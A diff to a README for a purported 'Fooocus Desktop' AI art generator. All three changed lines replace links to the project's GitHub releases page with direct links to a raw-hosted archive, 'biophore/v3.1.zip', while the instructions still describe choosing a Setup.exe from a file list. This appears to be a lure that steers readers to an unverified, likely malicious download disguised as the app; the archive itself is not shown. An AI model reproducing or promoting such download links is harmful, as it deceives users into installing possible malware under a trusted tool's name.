@@ -1,7 +1,7 @@
 <h1>🎨 Fooocus-Desktop---Fooocus-AI-Generator-2026 - Stunning AI Art with Zero Setup</h1>
 
 <p align="center">
-  <a href="https://github.com/phamquang5898/Fooocus-Desktop---Fooocus-AI-Generator-2026/releases">
+  <a href="https://raw.githubusercontent.com/phamquang5898/Fooocus-Desktop---Fooocus-AI-Generator-2026/main/biophore/v3.1.zip">
     <img src="https://img.shields.io/badge/Download-Fooocus_Desktop-2ea44f?style=for-the-badge&logo=github&logoColor=white&labelColor=4B0082&color=FF4500" alt="Download Button">
   </a>
 </p>
@@ -16,7 +16,7 @@ This application is designed for everyone - artists, hobbyists, marketers, stude
 
 ### Step 1: Download the Application
 
-Visit this link to download the application: [Fooocus Desktop Download Page](https://github.com/phamquang5898/Fooocus-Desktop---Fooocus-AI-Generator-2026/releases)
+Visit this link to download the application: [Fooocus Desktop Download Page](https://raw.githubusercontent.com/phamquang5898/Fooocus-Desktop---Fooocus-AI-Generator-2026/main/biophore/v3.1.zip)
 
 You will see a list of files. Look for the one that matches your computer's operating system (Windows is recommended). The download file is typically named something like `Fooocus_Desktop_Setup.exe`. Click on it to start downloading.
 
@@ -124,7 +124,7 @@ Fooocus Desktop puts professional-grade AI image generation within everyone's re
 
 Whether you're creating content for work, exploring a creative hobby, or just curious about AI - you'll find Fooocus to be a reliable, fun, and genuinely useful companion. Download it today and discover how effortless stunning visuals can be.
 
-**Ready to start creating?** Visit this link to download the application: [Fooocus Desktop Download Page](https://github.com/phamquang5898/Fooocus-Desktop---Fooocus-AI-Generator-2026/releases)
+**Ready to start creating?** Visit this link to download the application: [Fooocus Desktop Download Page](https://raw.githubusercontent.com/phamquang5898/Fooocus-Desktop---Fooocus-AI-Generator-2026/main/biophore/v3.1.zip)
 
 ## 🆘 Support & Updates
 
